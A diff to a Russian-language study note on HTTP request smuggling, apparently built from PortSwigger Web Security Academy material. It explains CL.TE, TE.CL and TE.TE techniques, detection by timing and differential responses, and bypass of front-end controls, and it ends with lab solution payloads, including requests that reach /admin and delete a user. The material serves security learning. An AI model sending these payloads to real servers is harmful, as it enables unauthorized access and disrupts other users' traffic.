@@ -79,6 +79,9 @@ q=smuggling
 > 
 > Однако многие веб-сайты имеют фронтенд сервер, поддерживающий HTTP/2, но развертывают его перед бэкэнд-инфраструктурой, которая поддерживает только HTTP/1. Это означает, что фронтенд сервер фактически должен преобразовывать получаемые запросы в HTTP/1. Этот процесс известен как понижение версии HTTP. Дополнительные сведения см. в разделе «[Расширенная контрабанда запросов](https://portswigger.net/web-security/request-smuggling/advanced)».
 
+
+![[Pasted image 20260223001037.png]]
+
 ---
 
 # Как выполнить атаку HTTP-контрабанды запросов
@@ -94,6 +97,521 @@ q=smuggling
 > Эти методы доступны только при использовании запросов HTTP/1. Браузеры и другие клиенты, включая Burp, по умолчанию используют HTTP/2 для связи с серверами, которые явно объявляют о его поддержке во время TLS-рукопожатия.
 > 
 > В результате при тестировании сайтов с поддержкой HTTP/2 необходимо вручную переключать протоколы в Burp Repeater. Это можно сделать в разделе **«Request attributes»** панели **«Inspector»**.
+
+---
+
+## Уязвимости CL.TE
+
+Здесь фронт-энд сервер использует заголовок `Content-Length`, а бэк-энд сервер — заголовок `Transfer-Encoding`. Мы можем выполнить простую атаку HTTP-контрабанды запросов следующим образом:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+
+Фронтенд сервер обрабатывает заголовок `Content-Length` и определяет, что тело запроса имеет длину 13 байт, до конца SMUGGLED. Этот запрос пересылается на бэкэнд-сервер.
+Бэкэнд-сервер обрабатывает заголовок `Transfer-Encoding` и, таким образом, рассматривает тело сообщения как использующее кодировку `chunked`. Он обрабатывает первый фрагмент, который имеет нулевую длину, и, таким образом, рассматривает его как завершающий запрос. Следующие байты, `SMUGGLED`, остаются необработанными, и бэкэнд-сервер будет рассматривать их как начало следующего запроса в последовательности.
+
+Лабораторная: [[#Lab HTTP request smuggling, basic CL.TE vulnerability]]
+
+---
+
+## Уязвимости TE.CL.
+
+Здесь фронт-энд сервер использует заголовок `Transfer-Encoding`, а бэк-энд сервер — заголовок `Content-Length`. Мы можем выполнить простую атаку HTTP-контрабанды запросов следующим образом:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+```
+
+  
+
+> [!note]
+> 
+> Чтобы отправить этот запрос с помощью Burp Repeater, сначала необходимо перейти в меню Repeater и убедиться, что опция «Update Content-Length» не отмечена.
+> 
+> Необходимо включить конечную последовательность `\r\n\r\n` после последнего 0.
+
+Фронтенд сервер обрабатывает заголовок `Transfer-Encoding` и поэтому рассматривает тело сообщения как использующее кодировку `chunked`. Он обрабатывает первый фрагмент, длина которого указана как 8 байт, до начала строки, следующей за `SMUGGLED`. Он обрабатывает второй фрагмент, длина которого указана как нулевая, и поэтому рассматривает его как завершающий запрос. Этот запрос пересылается на бэкэнд-сервер.
+
+Бэкэнд-сервер обрабатывает заголовок `Content-Length` и определяет, что тело запроса имеет длину 3 байта, до начала строки, следующей за 8. Следующие байты, начиная с `SMUGGLED`, остаются необработанными, и бэкэнд-сервер будет рассматривать их как начало следующего запроса в последовательности.
+
+Лабораторная: [[#Lab HTTP request smuggling, basic TE.CL vulnerability|Lab HTTP request smuggling, basic TE.CL vulnerability]]
+
+---
+
+## TE.TE: obfuscating the TE header
+
+В данном случае как фронт-энд, так и бэк-энд серверы поддерживают заголовок Transfer-Encoding, но один из серверов может быть вынужден не обрабатывать его путем запутывания заголовка каким-либо способом.
+
+  
+
+Существует бесконечное множество способов запутать заголовок Transfer-Encoding. Например:
+
+```http
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+Каждый из этих методов предполагает незначительное отклонение от спецификации HTTP. Реальный код, реализующий спецификацию протокола, редко соответствует ей с абсолютной точностью, и различные реализации часто допускают отклонения от спецификации. Чтобы обнаружить уязвимость TE.TE, необходимо найти такое отклонение в заголовке `Transfer-Encoding`, при котором только один из серверов (фронт-энд или бэк-энд) обрабатывает его, а другой сервер игнорирует.
+
+В зависимости от того, какой сервер — фронт-энд или бэк-энд — может быть побужден не обрабатывать запутывающий заголовок `Transfer-Encoding`, остальная часть атаки будет проходить так же, как и в случае с уже описанными уязвимостями CL.TE или TE.CL.
+
+Лабораторная: [[#Lab HTTP request smuggling, obfuscating the TE header]]
+
+---
+
+# Как выявить уязвимости, связанные с контрабандой HTTP-запросов
+
+---
+
+## Обнаружение уязвимостей HTTP-запросов с помощью методов измерения времени
+
+Наиболее эффективный способ обнаружения уязвимостей HTTP-запросов — отправка запросов, которые при наличии уязвимости вызывают задержку в ответах приложения. Этот метод используется Burp Scanner для автоматического обнаружения уязвимостей запросов.
+
+---
+
+### Обнаружение уязвимостей CL.TE с помощью методов измерения времени
+
+Если приложение уязвимо для варианта CL.TE контрабанды запросов, отправка запроса, подобного приведенному ниже, часто вызывает задержку:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+Поскольку фронтенд сервер использует заголовок `Content-Length`, он пересылает только часть этого запроса, опуская `X`. Бэкэнд сервер использует заголовок `Transfer-Encoding`, обрабатывает первый фрагмент, а затем ожидает поступления следующего фрагмента. Это приводит к заметной задержке.
+
+---
+
+### Поиск уязвимостей TE.CL с помощью методов измерения времени
+
+Если приложение уязвимо для варианта TE.CL контрабанды запросов, то отправка запроса, подобного следующему, часто приводит к задержке:
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+Поскольку фронтенд сервер использует заголовок `Transfer-Encoding`, он пересылает только часть этого запроса, опуская `X`. Бэкенд сервер использует заголовок `Content-Length`, ожидает большего количества содержимого в теле сообщения и ждет поступления оставшегося содержимого. Это приведет к заметной задержке.
+
+> [!note]
+> Тестирование уязвимостей TE.CL на основе времени может потенциально нарушить работу других пользователей приложения, если приложение уязвимо для варианта уязвимости CL.TE. Поэтому, чтобы быть незаметным и минимизировать сбои, сначала следует использовать тест CL.TE и переходить к тесту TE.CL только в том случае, если первый тест не дал результатов.
+
+---
+
+## Подтверждение HTTP request smuggling с помощью разницы ответов
+
+Когда обнаружена вероятная уязвимость запросов, вы можете получить дополнительные доказательства этой уязвимости, используя ее для выявления различий в содержании ответов приложения. Для этого необходимо отправить два запроса в приложение в быстрой последовательности:
+
+1. «Атакующий» запрос, предназначенный для вмешательства в обработку следующего запроса.
+2. «Обычный» запрос.
+
+> Если ответ на нормальный запрос содержит ожидаемое вмешательство, то уязвимость подтверждается.
+
+Например, предположим, что нормальный запрос выглядит следующим образом:
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+Этот запрос обычно получает HTTP-ответ с кодом статуса 200, содержащий некоторые результаты поиска.
+
+Запрос атаки, необходимый для вмешательства в этот запрос, зависит от варианта контрабанды запросов: CL.TE или TE.CL.
+
+---
+
+### Подтверждение уязвимостей CL.TE с помощью дифференциальных ответов
+
+Чтобы подтвердить уязвимость CL.TE, необходимо отправить запрос атаки, подобный следующему:
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+Если атака прошла успешно, последние две строки этого запроса обрабатываются бэкэнд-сервером как принадлежащие следующему полученному запросу. В результате последующий «нормальный» запрос будет выглядеть следующим образом:
+
+```http
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+Поскольку этот запрос теперь содержит недействительный URL-адрес, сервер ответит кодом состояния 404, указывая, что запрос атаки действительно помешал ему.
+
+Лабораторная: [[#Lab HTTP request smuggling, confirming a CL.TE vulnerability via differential responses]] 
+
+---
+
+### Подтверждение уязвимостей TE.CL с помощью дифференциальных ответов
+
+Чтобы подтвердить уязвимость TE.CL, необходимо отправить запрос атаки следующего вида:
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+
+
+```
+
+> [!note]
+>
+> - Чтобы отправить этот запрос с помощью Burp Repeater, сначала необходимо перейти в меню Repeater и убедиться, что опция «Update Content-Length» не отмечена.
+> - Вам необходимо включить конечную последовательность `\r\n\r\n` после последнего 0.
+
+Если атака прошла успешно, то все, начиная с `GET /404`, обрабатывается бэкэнд-сервером как принадлежащее следующему полученному запросу. В результате последующий «нормальный» запрос будет выглядеть следующим образом:
+
+```http
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+Поскольку этот запрос теперь содержит недействительный URL, сервер ответит кодом состояния 404, указывая, что запрос атаки действительно помешал ему.
+
+Лабораторная: [[#Lab HTTP request smuggling, confirming a TE.CL vulnerability via differential responses]]
+
+> [!note]
+> При попытке подтвердить уязвимости, связанные с контрабандой запросов, путем вмешательства в другие запросы, следует помнить о некоторых важных моментах:
+>
+> - «Атакующий» запрос и «нормальный» запрос должны отправляться на сервер с использованием разных сетевых подключений. Отправка обоих запросов через одно и то же подключение не докажет наличие уязвимости.
+> - Запрос «атаки» и «нормальный» запрос должны использовать, по возможности, одинаковые URL-адреса и имена параметров. Это связано с тем, что многие современные приложения направляют запросы фронт-энда на разные серверы бэк-энда на основе URL-адреса и параметров. Использование одинаковых URL-адресов и параметров увеличивает вероятность того, что запросы будут обработаны одним и тем же сервером бэк-энда, что необходимо для успешной атаки.
+> - При тестировании «нормального» запроса для обнаружения любого вмешательства со стороны «атакующего» запроса вы находитесь в конкуренции с любыми другими запросами, которые приложение получает в то же время, включая запросы от других пользователей. Вы должны отправить «нормальный» запрос сразу после «атакующего» запроса. Если приложение занято, вам может потребоваться несколько попыток, чтобы подтвердить наличие уязвимости.
+> - В некоторых приложениях фронтенд сервер функционирует как балансировщик нагрузки и перенаправляет запросы в разные бэкэнд-системы в соответствии с определенным алгоритмом балансировки нагрузки. Если ваши «атакующие» и «нормальные» запросы перенаправляются в разные бэкэнд-системы, то атака не удастся. Это еще одна причина, по которой вам может потребоваться несколько попыток, прежде чем уязвимость будет подтверждена.
+> - Если ваша атака успешно помешала последующему запросу, но это был не «нормальный» запрос, который вы отправили для обнаружения помех, то это означает, что ваша атака повлияла на другого пользователя приложения. Если вы продолжите тестирование, это может иметь разрушительные последствия для других пользователей, поэтому следует проявлять осторожность.
+
+---
+
+# Эксплуатация HTTP request smuggling уязвимостей
+
+---
+
+## Использование HTTP-запросов для обхода средств безопасности фронт-энда
+
+В некоторых приложениях веб-сервер фронт-энда используется для реализации некоторых средств безопасности, принимая решение о том, разрешить ли обработку отдельных запросов. Разрешенные запросы перенаправляются на бэкэнд-сервер, где считается, что они прошли через фронт-эндные средства контроля.
+
+Например, предположим, что приложение использует фронт-энд сервер для реализации ограничений контроля доступа, перенаправляя запросы только в том случае, если пользователь имеет право доступа к запрошенному URL. Затем бэкэнд-сервер выполняет каждый запрос без дополнительной проверки. В этой ситуации HTTP request smuggling уязвимость может быть использована для обхода контроля доступа путем передачи запроса на URL-адрес с ограниченным доступом.
+
+Предположим, что текущему пользователю разрешен доступ к `/home`, но не к `/admin`. Он может обойти это ограничение, используя следующую атаку с передачей запроса:
+
+```http
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+```
+
+Фронт-энд сервер видит здесь два запроса, оба на `/home`, и поэтому запросы перенаправляются на бэк-энд.
+
+Лабораторные: [[#Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability]], [[#Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability]]
+
+---
+
+# Лабораторные
+
+---
+
+## Lab: HTTP request smuggling, basic CL.TE vulnerability
+
+[Lab: HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+---
+
+## Lab: HTTP request smuggling, basic TE.CL vulnerability
+
+[Lab: HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+
+Сначала выключить  "Update Content-Length".
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+> Любой следующий запрос запустить метод "GPOST".
+> 
+> ![[Pasted image 20260223011718.png]]
+
+Либо 
+
+``` http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+
+25
+GPOST / HTTP/1.1
+Content-Length: 6
+
+0
+
+
+```
+> - Любой следующий запрос запустить метод "GPOST".
+> - Во втором `Content-Length` подходит любое значение от 6 до 9 в данном случае.
+> 
+> ![[Pasted image 20260223005542.png]]
+
+---
+
+## Lab: HTTP request smuggling, obfuscating the TE header
+
+[Lab: HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)
+
+Сначала выключить  "Update Content-Length".
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+25
+GPOST / HTTP/1.1
+Content-Length: 6
+
+0
+
+
+```
+> - Любой следующий запрос запустить метод "GPOST".
+
+---
+
+## Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+
+[Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 30
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+---
+
+## Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
+
+[Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
+
+```http
+POST /search HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+2c
+GET /404 HTTP/1.1
+Content-Length: 144
+
+x=
+0
+
+
+```
+> `Content-Length` во втором запросе обязателен и его значение не должно быть меньше 10.
+
+---
+
+## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+[Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)
+
+Получить доступ к админке:
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 90
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+
+Удалить carlos:
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 90
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+
+---
+
+## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+[Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
+
+Получить доступ к админке:
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+3f
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 144
+
+x=
+0
+
+
+```
+
+Удалить carlos:
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+56
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Length: 144
+
+x=
+0
+
+
+```
 
 ---
 
